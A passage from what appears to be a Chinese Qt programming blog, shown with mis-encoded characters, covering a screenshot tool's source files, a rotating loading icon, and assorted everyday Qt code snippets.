1234567891011//çª—ä½“è´´è¾¹if(this-&gt;pos().y()&lt;=0)//çª—ä½“è´´åœ¨å±å¹•ä¸Šè¾¹&#123; move(pos().x(),-29);//è´´è¾¹&#125; //çª—ä½“å¼¹å‡ºif(this-&gt;pos().y()&lt;=0)//é¼ æ ‡è¿›å…¥å¹¶ä¸”å·²ç»è´´è¾¹&#123; move(pos().x(),0);//å¼¹å‡ºæ•´ä¸ªçª—ä½“&#125; äº”ã€å·¥ç¨‹ç»“æ„ å…­ã€æºæ–‡ä»¶ screen.hæ–‡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#ifndef SCREEN_H#define SCREEN_H #include &lt;QWidget&gt;#include &lt;QPoint&gt;#include &lt;QMouseEvent&gt;#include &lt;QContextMenuEvent&gt;#include &lt;QMenu&gt;//å³é”®èœå•#include &lt;QPaintEvent&gt;#include &lt;QPainter&gt;//ç”»ç¬”#include &lt;QPixmap&gt;#include &lt;QDebug&gt;#include &lt;QDesktopWidget&gt;#include &lt;QApplication&gt;#include &lt;QFileDialog&gt;#include &lt;QShowEvent&gt;#include &lt;QClipboard&gt;#include &lt;QKeyEvent&gt;#include &lt;QRect&gt;#include &lt;QFile&gt; class Screen : public QWidget&#123; Q_OBJECTpublic: explicit Screen(QWidget *parent = 0); signals: public slots: void saveScreenOther();//æˆªå›¾å¦å­˜ä¸º void grapFullScreen();//å…¨å±æˆªå›¾ void copyScreen(); //å³é”®å¤åˆ¶åˆ°ç²˜è´´æ¿protected: void contextMenuEvent(QContextMenuEvent *); //--å³é”®èœå•äº‹ä»¶ void mousePressEvent(QMouseEvent *e); //--é¼ æ ‡æŒ‰ä¸‹äº‹ä»¶ void mouseMoveEvent(QMouseEvent *e); //--é¼ æ ‡ç§»åŠ¨äº‹ä»¶ void mouseReleaseEvent(QMouseEvent *e); //--é¼ æ ‡é‡Šæ”¾ï¼ˆæ¾å¼€ï¼‰äº‹ä»¶ void paintEvent(QPaintEvent *); //--ç”»å›¾äº‹ä»¶ void showEvent(QShowEvent *); //--çª—ä½“showäº‹ä»¶ void keyPressEvent(QKeyEvent *e); //--æŒ‰é”®äº‹ä»¶ private: QPoint beginPos;//è®°å½•é¼ æ ‡çš„èµ·å§‹ä½ç½® QPoint endPos;//è®°å½•é¼ æ ‡çš„ç»“æŸä½ç½® QMenu *menu; //å³é”®èœå•å¯¹è±¡ bool leftPres;//è®°å½•é¼ æ ‡å·¦é”®æ˜¯å¦æŒ‰ä¸‹ï¼ŒæŒ‰ä¸‹ä¸ºtrue QRect * rect; //çŸ©å½¢æˆªå›¾åŒºåŸŸpublic: QPixmap fullScreen;//å…¨å±æˆªå›¾ public: QPoint getBeginPos();//è·å–é¼ æ ‡çš„èµ·å§‹ä½ç½® QPoint getEndPos();//è·å–é¼ æ ‡çš„ç»“æŸä½ç½® void setBeginPos(QPoint p);//è®¾ç½®é¼ æ ‡çš„èµ·å§‹ä½ç½® void setEndPos(QPoint p);//è®¾ç½®é¼ æ ‡çš„ç»“æŸä½ç½® &#125;; #endif // SCREEN_H widgets.hæ–‡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940#ifndef WIDGET_H#define WIDGET_H #include &lt;QWidget&gt; namespace Ui &#123;class Widget;&#125; class Widget : public QWidget&#123; Q_OBJECT public: explicit Widget(QWidget *parent = 0); ~Widget(); private slots: void on_pushButton_clicked(); void on_pushButton_2_clicked(); void on_pushButton_4_clicked(); void on_pushButton_3_clicked(); protected: void enterEvent(QEvent *e); //--é¼ æ ‡è¿›å…¥äº‹ä»¶ void leaveEvent(QEvent *e); //--é¼ æ ‡ç¦»å¼€äº‹ä»¶ void mousePressEvent(QMouseEvent *e); //--é¼ æ ‡æŒ‰ä¸‹äº‹ä»¶ void mouseMoveEvent(QMouseEvent *e); //--é¼ æ ‡ç§»åŠ¨äº‹ä»¶ void mouseReleaseEvent(QMouseEvent *e); //--é¼ æ ‡é‡Šæ”¾ï¼ˆæ¾å¼€ï¼‰äº‹ä»¶private: Ui::Widget *ui;private: bool leftPress; QPoint beginPos;&#125;; #endif // WIDGET_H screen.cppæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181#include &quot;screen.h&quot; Screen::Screen(QWidget *parent) : QWidget(parent)&#123; beginPos = QPoint(-1,-1); endPos = beginPos; leftPres = false; setMouseTracking(true);//å¼€å¯é¼ æ ‡å®æ—¶è¿½è¸ªï¼Œå®æ—¶çš„æ˜¾ç¤ºé¼ æ ‡çš„ä½ç½® rect = new QRect(0,0,QApplication::desktop()-&gt;width(),QApplication::desktop()-&gt;height()); menu = new QMenu(this);//åˆ›å»ºå³é”®èœå• menu-&gt;addAction(&quot;å¤åˆ¶(CTRL+C)&quot;, this, SLOT(copyScreen())); menu-&gt;addAction(&quot;æˆªå›¾å¦å­˜ä¸º(ALT+C)&quot;, this, SLOT(saveScreenOther())); menu-&gt;addAction(&quot;å…¨å±æˆªå›¾(ALT+A)&quot;, this, SLOT(grapFullScreen())); menu-&gt;addAction(&quot;é€€å‡ºæˆªå›¾(ESC)&quot;, this, SLOT(hide()));&#125; void Screen::copyScreen() //å³é”®å¤åˆ¶åˆ°ç²˜è´´æ¿&#123; QGuiApplication::clipboard()-&gt;setPixmap(fullScreen.copy(*rect));&#125;void Screen::contextMenuEvent(QContextMenuEvent *) //å³é”®èœå•äº‹ä»¶&#123; this-&gt;setCursor(Qt::ArrowCursor); menu-&gt;exec(cursor().pos());&#125;void Screen::mousePressEvent(QMouseEvent *e) //--é¼ æ ‡æŒ‰ä¸‹äº‹ä»¶&#123; if (e-&gt;button() == Qt::LeftButton)//é¼ æ ‡å·¦é”®æŒ‰ä¸‹ &#123; leftPres = true; setBeginPos(e-&gt;pos());//é¼ æ ‡ç›¸å¯¹çª—ä½“çš„ä½ç½® &#125; &#125;void Screen::mouseMoveEvent(QMouseEvent *e) //--é¼ æ ‡ç§»åŠ¨äº‹ä»¶&#123; if(leftPres) &#123; setEndPos(e-&gt;pos()); &#125; update();//é‡ç»˜ã€è§¦å‘ç”»å›¾äº‹ä»¶ &#125;void Screen::mouseReleaseEvent(QMouseEvent *e) //--é¼ æ ‡é‡Šæ”¾ï¼ˆæ¾å¼€ï¼‰äº‹ä»¶&#123; leftPres = false; setEndPos(e-&gt;pos()); //ä½¿å¾—èµ·å§‹ç‚¹åœ¨å·¦ä¸Šè§’ï¼Œç»“æŸç‚¹åœ¨å³ä¸‹è§’ if(beginPos.x()&gt;endPos.x()) &#123; beginPos.setX(beginPos.x() + endPos.x()); endPos.setX(beginPos.x() - endPos.x()); beginPos.setX(beginPos.x() - endPos.x()); &#125; if(beginPos.y()&gt;endPos.y()) &#123; beginPos.setY(beginPos.y() + endPos.y()); endPos.setY(beginPos.y() - endPos.y()); beginPos.setY(beginPos.y() - endPos.y()); &#125; rect-&gt;setRect(beginPos.x(),beginPos.y(),endPos.x()-beginPos.x(),endPos.y()-beginPos.y()); &#125; QPoint Screen::getBeginPos()//è·å–é¼ æ ‡çš„èµ·å§‹ä½ç½®&#123; return beginPos;&#125;QPoint Screen::getEndPos()//è·å–é¼ æ ‡çš„ç»“æŸä½ç½®&#123; return endPos;&#125;void Screen::setBeginPos(QPoint p)//è®¾ç½®é¼ æ ‡çš„èµ·å§‹ä½ç½®&#123; this-&gt;beginPos = p;&#125;void Screen::setEndPos(QPoint p)//è®¾ç½®é¼ æ ‡çš„ç»“æŸä½ç½®&#123; this-&gt;endPos = p;&#125; void Screen::paintEvent(QPaintEvent *) //--ç”»å›¾äº‹ä»¶ &#123; QPainter painter(this); //å°†å½“å‰çª—ä½“å¯¹è±¡è®¾ç½®ä¸ºç”»å¸ƒ QPen pen; pen.setColor(Qt::red);//è®¾ç½®ç¬”è‰² pen.setWidth(1); //ç”»ç¬”çº¿æ¡å®½åº¦ painter.setPen(pen);//è®¾ç½®ç”»ç¬” int lx = beginPos.x()&lt;endPos.x()?beginPos.x():endPos.x();//çŸ©å½¢æˆªå›¾åŒºåŸŸå·¦ä¸Šè§’xåæ ‡ int ly = beginPos.y()&lt;endPos.y()?beginPos.y():endPos.y();//çŸ©å½¢æˆªå›¾åŒºåŸŸå³ä¸Šè§’xåæ ‡ int w = beginPos.x()&lt;endPos.x()?endPos.x()-beginPos.x():beginPos.x()-endPos.x();//çŸ©å½¢æˆªå›¾åŒºåŸŸå®½åº¦ int h = beginPos.y()&lt;endPos.y()?endPos.y()-beginPos.y():beginPos.y()-endPos.y();//çŸ©å½¢æˆªå›¾åŒºåŸŸé«˜åº¦ QRect rect = QRect(lx,ly,w,h);//çŸ©å½¢æˆªå›¾åŒºåŸŸ if(lx!=-1 &amp;&amp; w&gt;0 &amp;&amp; h&gt;0)//é˜²æ­¢ç¬¬ä¸€æ¬¡å°±é‡ç»˜ å¹¶ä¸”å®½é«˜å¤§äº0æ—¶æ‰è¿›è¡Œæˆªå›¾æ“ä½œ &#123; painter.drawPixmap(rect,fullScreen,rect);//é‡ç»˜æˆªå›¾çŸ©å½¢éƒ¨åˆ†ï¼Œå³æ¢å¤åŸå›¾ï¼Œè¾¾åˆ°å»é™¤å¹•å¸ƒæ•ˆæœ painter.drawRect(lx, ly, w, h);//ç”»æˆªå›¾çŸ©å½¢ //æˆªå›¾åŒºåŸŸå¤§å°ä½ç½®æç¤º if(ly&gt;10)//é¿å…çœ‹ä¸åˆ°æç¤º,åœ¨æˆªå›¾çŸ©å½¢ä¸Šè¾¹ä¸æ¥è¿‘å±å¹•ä¸Šè¾¹æ—¶ï¼Œæç¤ºåœ¨æˆªå›¾çŸ©å½¢çš„ä¸Šè¾¹çš„ä¸Šé¢ &#123; painter.drawText(lx + 2, ly - 8, tr(&quot;æˆªå›¾èŒƒå›´(%1,%2) - (%3,%4) æˆªå›¾å¤§å°ï¼š(%5 x %6)&quot;) .arg(lx).arg(ly).arg(lx + w).arg(ly + h).arg(w).arg(h)); &#125; else//åœ¨æˆªå›¾çŸ©å½¢ä¸Šè¾¹æ¥è¿‘å±å¹•ä¸Šè¾¹æ—¶ï¼Œæç¤ºåœ¨æˆªå›¾çŸ©å½¢çš„ä¸Šè¾¹çš„ä¸‹é¢ &#123; painter.drawText(lx + 2, ly + 12, tr(&quot;æˆªå›¾èŒƒå›´(%1,%2) - (%3,%4) æˆªå›¾å¤§å°ï¼š(%5 x %6)&quot;) .arg(lx).arg(ly).arg(lx + w).arg(ly + h).arg(w).arg(h)); &#125; &#125; //å®æ—¶æ˜¾ç¤ºé¼ æ ‡çš„ä½ç½® painter.drawText(cursor().pos().x(), cursor().pos().y(), tr(&quot;(%1,%2)&quot;) .arg(cursor().pos().x()).arg(cursor().pos().y())); &#125; void Screen::showEvent(QShowEvent *) //--çª—ä½“showäº‹ä»¶ &#123; //è®¾ç½®é€æ˜åº¦å®ç°æ¨¡ç³ŠèƒŒæ™¯ setWindowOpacity(0.7); &#125; void Screen::saveScreenOther() &#123; QString fileName = QFileDialog::getSaveFileName(this, &quot;æˆªå›¾å¦å­˜ä¸º&quot;, &quot;&quot;, &quot;Image (*.jpg *.png *.bmp)&quot;); if (fileName.length() &gt; 0) &#123; fullScreen.copy(*rect).save(fileName,&quot;bmp&quot;); close(); &#125; &#125; void Screen::grapFullScreen() &#123; endPos.setX(-1);//æ­¤æ—¶é¿å…ç”»æˆªå›¾çŸ©å½¢ QString fileName = QFileDialog::getSaveFileName(this, &quot;ä¿å­˜å…¨å±æˆªå›¾&quot;, &quot;&quot;, &quot;JPEG Files (*.jpg)&quot;); if (fileName.length() &gt; 0) &#123; fullScreen.save(fileName, &quot;jpg&quot;); close(); &#125; this-&gt;hide(); &#125; void Screen::keyPressEvent(QKeyEvent *e) //æŒ‰é”®äº‹ä»¶ &#123; /// Esc é”®é€€å‡ºæˆªå›¾; if (e-&gt;key() == Qt::Key_Escape) &#123; hide(); &#125;///CTRL+C å¤åˆ¶ else if(e-&gt;key() == Qt::Key_C &amp;&amp; e-&gt;modifiers() == Qt::ControlModifier) &#123; QGuiApplication::clipboard()-&gt;setPixmap(fullScreen.copy(*rect)); &#125;///æˆªå›¾å¦å­˜ä¸º(ALT+C) else if(e-&gt;key() == Qt::Key_C &amp;&amp; e-&gt;modifiers() == Qt::AltModifier) &#123; saveScreenOther(); &#125;///å…¨å±æˆªå›¾(ALT+A) else if(e-&gt;key() == Qt::Key_A &amp;&amp; e-&gt;modifiers() == Qt::AltModifier) &#123; grapFullScreen(); &#125; else &#123; e-&gt;ignore(); &#125; &#125; widget.cppæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;#include &lt;QMessageBox&gt;#include &lt;QDesktopWidget&gt;#include &lt;QFileDialog&gt;#include &lt;QScreen&gt;#include &lt;QString&gt;#include &lt;QDebug&gt;#include &lt;QPoint&gt;#include &lt;QTime&gt;#include &quot;screen.h&quot; Widget::Widget(QWidget *parent) : QWidget(parent), ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); beginPos = this-&gt;pos(); leftPress = false; this-&gt;setProperty(&quot;CanMove&quot;, true); //å®ç°æ— è¾¹æ¡† (Qt::FramelessWindowHintå»è¾¹æ¡†) Qt::WindowStaysOnTopHint çª—ä½“ç½®é¡¶ é˜²æ­¢æ‹–åˆ°ä»»åŠ¡æ ä¸‹é¢ this-&gt;setWindowFlags(Qt::FramelessWindowHint | Qt::WindowSystemMenuHint | Qt::WindowMinMaxButtonsHint|Qt::WindowStaysOnTopHint);&#125; Widget::~Widget()&#123; delete ui;&#125; void Widget::mousePressEvent(QMouseEvent *e) //--é¼ æ ‡æŒ‰ä¸‹äº‹ä»¶&#123; if (e-&gt;button() == Qt::LeftButton)//é¼ æ ‡å·¦é”®æŒ‰ä¸‹ &#123; leftPress = true; beginPos = e-&gt;pos();//é¼ æ ‡ç›¸å¯¹çª—ä½“çš„ä½ç½® &#125;&#125;void Widget::mouseMoveEvent(QMouseEvent *e) //--é¼ æ ‡ç§»åŠ¨äº‹ä»¶&#123; if (leftPress) &#123;//å½“å‰é¼ æ ‡ç›¸å¯¹çª—ä½“çš„ä½ç½®-åˆšæŒ‰ä¸‹å·¦é”®æ—¶çš„ç›¸å¯¹ä½ç½®=é¼ æ ‡ç§»åŠ¨çš„å¤§å° move(e-&gt;pos() - beginPos + this-&gt;pos()); // é¼ æ ‡ç§»åŠ¨çš„å¤§å°+çª—ä½“åŸæ¥çš„ä½ç½®=çª—ä½“ç§»åŠ¨åçš„ä½ç½® &#125; &#125;void Widget::mouseReleaseEvent(QMouseEvent *e) //--é¼ æ ‡é‡Šæ”¾ï¼ˆæ¾å¼€ï¼‰äº‹ä»¶&#123; leftPress = false;&#125;void Widget::enterEvent(QEvent *e) //--é¼ æ ‡è¿›å…¥äº‹ä»¶&#123; if(this-&gt;pos().y()&lt;=0)//é¼ æ ‡è¿›å…¥å¹¶ä¸”å·²ç»è´´è¾¹ &#123; move(pos().x(),0);//å¼¹å‡ºæ•´ä¸ªçª—ä½“ &#125; &#125;void Widget::leaveEvent(QEvent *e) //--é¼ æ ‡ç¦»å¼€äº‹ä»¶&#123; if(this-&gt;pos().y()&lt;=0)//çª—ä½“è´´åœ¨å±å¹•ä¸Šè¾¹ &#123; move(pos().x(),-29);//è´´è¾¹ &#125;&#125; void Widget::on_pushButton_2_clicked()&#123; //æˆªå›¾ä¹‹å‰éšå»çª—ä½“ï¼Œä¸ç„¶æˆªå›¾ä¹‹ä¸­å°±ä¼šæœ‰çª—ä½“çš„å­˜åœ¨ if( windowState() != Qt::WindowMinimized ) &#123; setWindowState( Qt::WindowMinimized );//æœ€å°åŒ–çˆ¶çª—ä½“ &#125; //å»¶æ—¶ç­‰å¾…çˆ¶çª—ä½“æœ€å°åŒ– å»¶æ—¶250æ¯«ç§’ QTime _Timer = QTime::currentTime().addMSecs(250); while( QTime::currentTime() &lt; _Timer ) &#123; QCoreApplication::processEvents(QEventLoop::AllEvents, 100); &#125; //å…ˆè·å–å…¨å±æˆªå›¾ï¼Œå†æ‹‰ä¸Šå¹•å¸ƒ Screen *m = new Screen(); m-&gt;fullScreen = QPixmap::grabWindow(QApplication::desktop()-&gt;winId()); m-&gt;showFullScreen(); &#125; void Widget::on_pushButton_clicked()&#123; //è·å–å…¨å±æˆªå›¾ QPixmap p = QPixmap::grabWindow(QApplication::desktop()-&gt;winId()); //æ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡† QString fileName = QFileDialog::getSaveFileName(this, &quot;æ–‡ä»¶å¦å­˜ä¸º&quot;,&quot;&quot;,tr(&quot;Config Files (*.bmp)&quot;)); //ä¿å­˜æˆªå›¾ if(fileName.length() &gt; 0 &amp;&amp; p.save(fileName,&quot;bmp&quot;)) &#123; QMessageBox::information(this, &quot;æç¤º&quot;, &quot;ä¿å­˜æˆåŠŸ!&quot;,QMessageBox::Ok); &#125; &#125; void Widget::on_pushButton_4_clicked()&#123; if( windowState() != Qt::WindowMinimized ) &#123; setWindowState( Qt::WindowMinimized );//æœ€å°åŒ–çª—ä½“ &#125;&#125; void Widget::on_pushButton_3_clicked()&#123; this-&gt;close();//å…³é—­çª—ä½“&#125; main.cppæ–‡ä»¶ 12345678910111213#include &quot;widget.h&quot;#include &lt;QApplication&gt;#include &lt;screen.h&gt;#include &lt;QDebug&gt;int main(int argc, char *argv[])&#123; QApplication a(argc, argv); Widget w; w.show(); return a.exec();&#125; ä¸ƒã€æ³¨æ„äº‹é¡¹ ****update()è§¦å‘***paintEventé‡ç»˜äº‹ä»¶ï¼Œä¸æ˜¯ç›´æ¥è°ƒç”¨*paintEvent()ã€‚","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"æˆªå›¾","slug":"æˆªå›¾","permalink":"https://hodlyounger.github.io/tags/%E6%88%AA%E5%9B%BE/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘å›¾ç‰‡æ—‹è½¬","date":"2023-10-27T01:24:02.243Z","path":"B_Code/Qt/ã€Qtã€‘å›¾ç‰‡æ—‹è½¬/","text":"Qt loading æ ·å¼ å›¾ç‰‡æ—‹è½¬ å›¾ç‰‡æ—‹è½¬å¯ä»¥ä½¿ç”¨painteventæ—¶é—´ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨å®ç°ã€‚å¦‚ä¸‹ä¸ºä½¿ç”¨è¿‡æ»¤å™¨çš„æ–¹å¼å®ç°å›¾ç‰‡æ—‹è½¬ã€‚ é¦–å…ˆåœ¨ UI ä¸­ç»˜åˆ¶ ä¸€ä¸ª QLabel ç”¨äºæ‰¿è½½æ—‹è½¬å›¾ç‰‡ã€‚ 1ui-&gt;labelLoadIcon ç„¶åç»™è½½ä½“å®‰è£…è¿‡æ»¤å™¨äº‹ä»¶ï¼Œä¿è¯å…¶å¯è§¦å‘çš„çŠ¶æ€ 1ui-&gt;labelLoadIcon-&gt;installEventFilter(this); å†™è¿‡æ»¤å™¨è¦å®ç°çš„åŠŸèƒ½ï¼Œæ—‹è½¬ 123456789101112131415161718bool QAuthInit::eventFilter(QObject* watched, QEvent* event)&#123; if (watched == ui-&gt;labelLoadIcon &amp;&amp; event-&gt;type() == QEvent::Paint &amp;&amp; !this-&gt;parentWidget()-&gt;isHidden()) &#123; QImage loading = QImage(&quot;:/loading.jpg&quot;); QPainter painter_inner(ui-&gt;labelLoadIcon); painter_inner.setPen(Qt::NoPen); painter_inner.setBrush(Qt::NoBrush); painter_inner.setRenderHint(QPainter::SmoothPixmapTransform); painter_inner.translate(loading.width() / qreal(2) + 0, loading.height() / qreal(2) + 0); //è®¾ç½®æ—‹è½¬ä¸­å¿ƒ painter_inner.rotate(-m_nAngle_ring); //æ—‹è½¬ painter_inner.translate(-(loading.width() / qreal(2) + 0), -(loading.height() / qreal(2) + 0)); //å°†åŸç‚¹å¤ä½ painter_inner.drawImage(QPointF(0, 0), loading); &#125; // äº‹ä»¶ä»ç„¶æŠ›ç»™QT return QWidget::eventFilter(watched, event);&#125; å®šæ—¶è°ƒç”¨ï¼Œä½¿è¿‡æ»¤å™¨ä¸­æ—‹è½¬çš„è§’åº¦å˜åŒ–ï¼Œä»è€Œè¾¾åˆ°æ—‹è½¬çš„æ•ˆæœ 1234567QTimer* timerLoading = new QTimer(this);timerLoading-&gt;setInterval(5);connect(timerLoading, &amp;QTimer::timeout, this, &amp;LoadingWidget::onTimeOut); // åœ¨æ§½å‡½æ•°ä¸­ä¿®æ”¹ m_nAngle_ring çš„å€¼timerLoading-&gt;start(); å®šæ—¶å™¨æ§½å‡½æ•° 1234567891011121314void LoadingWidget::onTimeOut()&#123; if (!this-&gt;parentWidget()-&gt;isHidden()) &#123; //æ¯æ¬¡é—´éš”è½¬2åº¦,ä¹Ÿå°±æ˜¯è¯´è½¬ä¸€åœˆéœ€è¦180æ¬¡ if (m_nAngle_ring == 360) &#123; m_nAngle_ring = 0; &#125; m_nAngle_ring += 2; ui-&gt;labelLoadIcon-&gt;update(); &#125; &#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"æ—‹è½¬","slug":"æ—‹è½¬","permalink":"https://hodlyounger.github.io/tags/%E6%97%8B%E8%BD%AC/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘å¸¸ç”¨åŸºç¡€ä»£ç æ±‡æ€»","date":"2023-10-27T01:24:02.243Z","path":"B_Code/Qt/ã€Qtã€‘å¸¸ç”¨åŸºç¡€ä»£ç æ±‡æ€»/","text":"æ¦‚è¿°ï¼š Qt å¼€å‘å¸¸ç”¨ä»£ç æ•´ç† [toc] 1ã€show() ä¸ exec() showæ˜¾ç¤ºçš„æ˜¯éæ¨¡æ€å¯¹è¯æ¡†ï¼›execæ˜¾ç¤ºçš„æ˜¯æ¨¡æ€å¯¹è¯æ¡†ã€‚ 2ã€è®¾ç½®æ— è¾¹æ¡†çª—å£ 1this-&gt;setWindowFlags(Qt::FramelessWindowHint); //è®¾ç½®ä¸ºæ— è¾¹æ¡†çª—å£ 3ã€è®¾ç½®çª—ä½“é€æ˜ 1this-&gt;setAttribute(Qt::WA_TranslucentBackground); //è®¾ç½®çª—ä½“é€æ˜ 4ã€Qtå­—ç¬¦ä¸²è½¬æ¢ 123456789101112131415#ifdef UNICODE #define QStringToTCHAR(x) (wchar_t*) x.utf16()#define PQStringToTCHAR(x) (wchar_t*) x-&gt;utf16()#define TCHARToQString(x) QString::fromUtf16((x))#define TCHARToQStringN(x,y) QString::fromUtf16((x),(y)) #else #define QStringToTCHAR(x) x.local8Bit().constData()#define PQStringToTCHAR(x) x-&gt;local8Bit().constData()#define TCHARToQString(x) QString::fromLocal8Bit((x))#define TCHARToQStringN(x,y) QString::fromLocal8Bit((x),(y)) #endif 5ã€Qssè¯»å– 123456789101112131415161718192021void Widget::InitStyle(int i)&#123; m_LCD_Hour-&gt;setStyleSheet(&quot; font: 18px black;&quot;); if(i != 0) &#123; QFile file(QString(&quot;:/Assert/qss/style%1.qss&quot;).arg(i)); file.open(QFile::ReadOnly); this-&gt;setStyleSheet(file.readAll()); file.close(); return; &#125; // m_LCD_Min-&gt;setStyleSheet(&quot;color: black; &quot;); // m_LCD_Sec-&gt;setStyleSheet(&quot;color: black; &quot;); QFile file(QString(&quot;:/Assert/qss/main.qss&quot;)); file.open(QFile::ReadOnly); this-&gt;setStyleSheet(file.readAll()); file.close();&#125; 6ã€QWidgetè‡ªåŠ¨åˆ—å®½ 12// TreeWidget è‡ªåŠ¨åˆ—å®½ add by mingming.shi 2021-10-23ui.treeWidget-&gt;header()-&gt;setSectionResizeMode(QHeaderView::ResizeToContents); 7ã€Qsså†™æ³•å‚è€ƒ QSSå•ç‹¬è®¾ç½®æŸæ§ä»¶æ ·å¼ 8ã€Qtæ­£åˆ™è¡¨è¾¾å¼ 123456789101112131415161718QRegExp rx(&quot;\\\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\b&quot;); //IPçš„æ­£åˆ™è¡¨è¾¾å¼if(!rx.exactMatch(m_lineEdit-&gt;text()))&#123; QMessageBox::critical(this, tr(&quot;Error&quot;), tr(&quot;IP WRONG.\\n&quot; &quot;Please Make Sure Input Correct IP!&quot;), QMessageBox::Ok); return ;&#125;if(m_lineEdit-&gt;text().toInt() &lt;= 0)&#123; QMessageBox::information(this, tr(&quot;Info&quot;), tr(&quot;IP Correct.\\n&quot; &quot;Input Correct IP is Saved!&quot;), QMessageBox::Ok); return;&#125; 9ã€å­—ä½“ç›¸å…³ æŸ¥è¯¢ç³»ç»Ÿæ”¯æŒçš„å­—ä½“ 1234QFontDatabase database;foreach (const QString &amp;family, database.families()) &#123; qDebug()&lt;&lt;family;&#125; è®¾ç½®å…¨å±€å­—ä½“ fontå†…å®¹ä¸ºfamilyæŸ¥è¯¢åˆ°çš„å­—ä½“åç§° 12QFont font(&quot;family&quot;);QApplication::setFont(font); å¤–éƒ¨åŠ è½½å­—ä½“ å­—ä½“æ”¯æŒttcæˆ–ttfæ ¼å¼åŠ è½½ï¼› ä½¿ç”¨addApplicationFontå¯ä»¥ä¸ºç³»ç»Ÿè·¯å¾„ï¼Œä¹Ÿå¯ä»¥èµ„æºæ–‡ä»¶ã€‚ 123456789int fontId = QFontDatabase::addApplicationFont(&quot;font.ttc&quot;);QStringList fontIDs = QFontDatabase::applicationFontFamilies(fontId);if (! fontIDs.isEmpty()) &#123; QFont font(fontIDs.first()); QApplication::setFont(font);&#125;else &#123; qDebug()&lt;&lt;&quot;Failed to load font.&quot;;&#125; 10. Qté” 123456789101112131415161718QMutex mutex;int number = 6;void method1()&#123; mutex.lock(); number *= 5; number /= 4; mutex.unlock();&#125;void method2()&#123; mutex.lock(); number *= 3; number /= 2; mutex.unlock();&#125; 11ã€ è®¡æ—¶å™¨ å®šæ—¶å™¨ è®¡æ—¶å™¨ 123456789QTimer *timer = new QTimer;connect(timer, SIGNAL(timeout()), this, SLOT(slotTimeOut()));// æˆ–è€…connect(timer, &amp;QTimer::timeout, this, [=]()mutable&#123; slotTimeOut();&#125;);timer-&gt;start(1000); å•æ¬¡å®šæ—¶å™¨ 1234// 3ç§’å å¯ç”¨ä¸‹è½½æŒ‰é’®QTimer::singleShot(3 * 1000, this, [=]() &#123; ui-&gt;pushBtnUpgrade-&gt;setDisabled(false); &#125;); 12ã€ä¹±ç é—®é¢˜ åœ¨å¤´æ–‡ä»¶æ·»åŠ ä»¥ä¸‹ä»£ç å³å¯ã€‚ 123#if defined(_MSC_VER) &amp;&amp; (_MSC_VER &gt;= 1600) #pragma execution_character_set(&quot;utf-8&quot;)#endif 13ã€ QTextBrower è®¾ç½®å­—ä½“é¢œè‰² 12345#define TEXT_COLOR_RED(STRING) &quot;&lt;font color=red&gt;&quot; + STRING + &quot;&lt;/font&gt;&quot; &quot;&lt;font color=black&gt; &lt;/font&gt;&quot;#define TEXT_COLOR_BLUE(STRING) &quot;&lt;font color=blue&gt;&quot; + STRING + &quot;&lt;/font&gt;&quot; &quot;&lt;font color=black&gt; &lt;/font&gt;&quot;#define TEXT_COLOR_GREEN(STRING) &quot;&lt;font color=green&gt;&quot; + STRING + &quot;&lt;/font&gt;&quot; &quot;&lt;font color=black&gt; &lt;/font&gt;&quot;ui-&gt;textBrowser-&gt;setText(TEXT_COLOR_BLUE(content)); 14 Qt httpä¸‹è½½ç½‘ç»œä¸­æ–­é—®é¢˜ ä½¿ç”¨ QNetworkAccessManager ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œç½‘ç»œä¸­æ–­è¿”å›çš„å¼‚å¸¸å—ä»ç„¶æ˜¯200ï¼Œéœ€è¦åˆ¤æ–­ slotFinished å‡½æ•°ä¸­éœ€è¦åˆ¤æ–­ error çš„çŠ¶æ€æ¥åˆ¤æ–­ä¸‹è½½æ˜¯å¦æ­£å¸¸ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768void QHttpDownloadObject::Init()&#123; QNetworkAccessManager *m_pManager = new QNetworkAccessManager(this); m_pOnlinemanager = new QNetworkConfigurationManager(this); // (&quot;ftp&quot;, &quot;file&quot;, &quot;qrc&quot;, &quot;http&quot;, &quot;https&quot;, &quot;data&quot;) qDebug() &lt;&lt; m_pManager-&gt;supportedSchemes(); m_pManager-&gt;setNetworkAccessible(QNetworkAccessManager::Accessible); QNetworkConfigurationManager manager; m_pManager-&gt;setConfiguration(manager.defaultConfiguration()); connect(m_pManager, SIGNAL(finished(QNetworkReply*)), this, SLOT(slotRequestFinished(QNetworkReply*)));&#125;void QHttpDownloadObject::PerformRequest(QString strUrl)&#123; QNetworkRequest request; request.setUrl(QUrl(strUrl)); request.setHeader(QNetworkRequest::ContentTypeHeader, &quot;application/x-www-form-urlencoded&quot;); m_fileTmp.setFileName(m_DestFilePath); m_fileTmp.open(QIODevice::Append); m_pReply = 